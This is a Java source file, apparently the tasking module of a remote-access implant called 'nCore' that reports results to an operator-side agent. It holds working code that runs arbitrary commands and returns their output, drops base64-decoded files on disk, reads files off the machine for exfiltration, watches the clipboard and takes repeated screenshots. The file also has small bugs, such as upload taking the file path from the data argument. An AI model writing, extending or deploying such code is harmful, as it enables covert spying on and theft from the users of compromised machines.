package com.nocebo.nCore;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Rectangle;
import java.awt.HeadlessException;
import java.awt.image.BufferedImage;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.file.FileVisitOption;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.util.List;
import java.util.concurrent.TimeUnit;

import javax.imageio.ImageIO;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;

import org.w3c.dom.Document;


public class genLib
{
    public void process(String[] args) throws ParserConfigurationException
    {
        
        Hashtable<String,String> procData = new Hashtable();
                
        String procName = new String();
        String[] procArgs = new String[]{};
        List<String> arglist = Arrays.asList(args);
        int nameDex = arglist.indexOf("command");
        int argDex = arglist.indexOf("arguments");
        StringBuilder fullOut = new StringBuilder();

        if (nameDex != -1 && argDex != -1)
        {
            procName = args[nameDex+1];
            procArgs = args[argDex+1].split("\\.");

            String[] cmdArrayData = Stream.concat(Arrays.stream(new String[]{procName}),Arrays.stream(procArgs)).toArray(String[]::new);
            
            try
            {
                Process jProc = Runtime.getRuntime().exec(cmdArrayData);

                BufferedReader stdInput = new BufferedReader(new InputStreamReader(jProc.getInputStream()));

                String outLine;
                while ((outLine = stdInput.readLine()) != null) {
                    fullOut.append(outLine).append("\n");
                }
                

                procData.put("uuid",iAgent.sessUUID);
                procData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                procData.put("process_output", fullOut.toString());
                procData.put("error","");
            }
            catch (Exception r)
            {
                procData.put("uuid",iAgent.sessUUID);
                procData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                procData.put("process_status", "failed");
                procData.put("error",r.getMessage());
            }

        }
        else if (nameDex != -1 && argDex == -1)
        {
            procName = args[nameDex+1];

            String[] cmdArrayData = new String[]{procName};

            try
            {
                Process jProc = Runtime.getRuntime().exec(cmdArrayData);

                BufferedReader stdInput = new BufferedReader(new InputStreamReader(jProc.getInputStream()));

                String outLine;
                while ((outLine = stdInput.readLine()) != null) {
                    fullOut.append(outLine).append("\n");
                }
                
                procData.put("uuid",iAgent.sessUUID);
                procData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                procData.put("process_output", fullOut.toString());
                procData.put("error","");
            }
            catch (Exception r)
            {
                procData.put("uuid",iAgent.sessUUID);
                procData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                procData.put("process_status", "failed");
                procData.put("error",r.getMessage());
            }
        }
        else
        {
            procData.put("uuid",iAgent.sessUUID);
            procData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
            procData.put("process_status", "failed");
            procData.put("error","command not specified");
        }
        Document metaDoc = iAgent.nUtil.outputToXmlDoc("process",procData);
        iAgent.output.add(metaDoc);

    }

    public void upload(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        Hashtable<String,String> uploadData = new Hashtable();
                
        String data = new String();
        String location = new String();
        List<String> arglist = Arrays.asList(args);
        int dataDex = arglist.indexOf("data");
        int locDex = arglist.indexOf("location");
          
        if (dataDex != -1 && locDex != -1)
        {
            data = args[dataDex+1];
            location = args[dataDex+1];
            byte[] decodedFileBytes = Base64.getDecoder().decode(data);

            try
            {
                Files.write(Paths.get(location), decodedFileBytes);
                uploadData.put("uuid",iAgent.sessUUID);
                uploadData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                uploadData.put("upload_status", "success");
                uploadData.put("error","");
            }
            catch (Exception e)
            {
                uploadData.put("uuid",iAgent.sessUUID);
                uploadData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                uploadData.put("upload_status", "failed");
                uploadData.put("error",e.getMessage());
            }
        }
        else
        {
            uploadData.put("uuid",iAgent.sessUUID);
            uploadData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
            uploadData.put("upload_status", "aborted");
            uploadData.put("error","data or location not specified");
        }
        Document metaDoc = iAgent.nUtil.outputToXmlDoc("upload",uploadData);
        iAgent.output.add(metaDoc);

    }

    public void download(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        Hashtable<String,String> downloadData = new Hashtable();
                
        String location = new String();
        List<String> arglist = Arrays.asList(args);
        int dataDex = arglist.indexOf("data");
        int locDex = arglist.indexOf("location");
          
        if (locDex != -1)
        {
            location = args[locDex+1];
            byte[] decodedFileBytes = Base64.getDecoder().decode(args[dataDex+1]);

            try
            {
                byte[] fileBytes = Files.readAllBytes(Paths.get(location));

                String b64EncodedBytes = new String(
                    Base64.getEncoder().encode(
                        fileBytes
                    )
                );
                downloadData.put("uuid",iAgent.sessUUID);
                downloadData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                downloadData.put("download_data", b64EncodedBytes);
                downloadData.put("download_status", "success");
                downloadData.put("error","");
            }
            catch (Exception e)
            {
                downloadData.put("uuid",iAgent.sessUUID);
                downloadData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                downloadData.put("download_status", "failed");
                downloadData.put("error",e.getMessage());
            }
        }
        else
        {
            downloadData.put("uuid",iAgent.sessUUID);
            downloadData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
            downloadData.put("download_status", "aborted");
            downloadData.put("error","data or location not specified");
        }
        Document metaDoc = iAgent.nUtil.outputToXmlDoc("upload",downloadData);
        iAgent.output.add(metaDoc);
    }

    public void clipper(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException, InterruptedException
    {
        int duration = 0;
        List<String> arglist = Arrays.asList(args);
        int duraDex = arglist.indexOf("duration");        

        if (duraDex != -1)
        {
            duration = Integer.parseInt(args[duraDex+1]);
            long durationMax = new Date().getTime() + (duration*1000);

            
                    
            String recentContent = "";
            while (new Date().getTime() < durationMax)
            {
                Hashtable<String,String> clipperData = new Hashtable();
                
                try
                {
                    //this chunk comes from a stackoverflow item: https://stackoverflow.com/questions/14226064/calling-a-method-when-content-of-clipboard-is-changed
                    Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
                    List<DataFlavor> flavors = Arrays.asList(sysClip.getAvailableDataFlavors());
                    // this implementation only supports string-flavor
                    if (flavors.contains(DataFlavor.stringFlavor)) {
                        String data = (String) sysClip.getData(DataFlavor.stringFlavor);
                        if (!data.equals(recentContent)) {
                            recentContent = data;
                            clipperData.put("uuid",iAgent.sessUUID);
                            clipperData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                            clipperData.put("clipper_data", data);
                            clipperData.put("error","");
                            Document metaDoc = iAgent.nUtil.outputToXmlDoc("clipper",clipperData);
                            iAgent.output.add(metaDoc);
                        }
                    }
                }
                catch (Exception IllegalStateException)
                {
                    
                }
                TimeUnit.MILLISECONDS.sleep(750);

            }
        }
        else
        {
            Hashtable<String,String> clipperData = new Hashtable();
            clipperData.put("uuid",iAgent.sessUUID);
            clipperData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
            clipperData.put("error","duration not specified");
            Document metaDoc = iAgent.nUtil.outputToXmlDoc("clipper",clipperData);
            iAgent.output.add(metaDoc);
        }
    }

    public void snapper(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException, InterruptedException
    {
                
        int duration = 0;
        int frequency = 0;
        List<String> arglist = Arrays.asList(args);
        int duraDex = arglist.indexOf("duration");
        int freqDex = arglist.indexOf("frequency");
        
    
        if (duraDex != -1 && freqDex != -1)
        {

            duration = Integer.parseInt(args[duraDex+1]);
            frequency = Integer.parseInt(args[freqDex+1]);
            long durationMax = new Date().getTime() + (duration*1000);
            int interval = duration/frequency;

            while (new Date().getTime() < durationMax)
            {
                Hashtable<String,String> snapperData = new Hashtable();
                try {
                    Robot robot = new Robot();
                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                    BufferedImage image = robot.createScreenCapture(screenRect);

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ImageIO.write(image, "png", baos);
                    byte[] imageBytes = baos.toByteArray();

                    String b64EncodedImage = new String(
                        Base64.getEncoder().encode(
                            imageBytes
                        )
                    );

                    snapperData.put("uuid",iAgent.sessUUID);
                    snapperData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                    snapperData.put("snapper_data", b64EncodedImage);
                    snapperData.put("error","");
                    Document metaDoc = iAgent.nUtil.outputToXmlDoc("snapper",snapperData);
                    iAgent.output.add(metaDoc);
                    
                } catch (Exception ex) {
                    snapperData.put("uuid",iAgent.sessUUID);
                    snapperData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                    snapperData.put("error","unable to capture screen");
                    Document metaDoc = iAgent.nUtil.outputToXmlDoc("snapper",snapperData);
                    iAgent.output.add(metaDoc);
                }
            }

            TimeUnit.MILLISECONDS.sleep(interval*1000);

        }
        else
        {
            Hashtable<String,String> snapperData = new Hashtable();
            snapperData.put("uuid",iAgent.sessUUID);
            snapperData.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
            snapperData.put("error","duration or frequency not specified");
            Document metaDoc = iAgent.nUtil.outputToXmlDoc("snapper",snapperData);
            iAgent.output.add(metaDoc);
        }
    }
}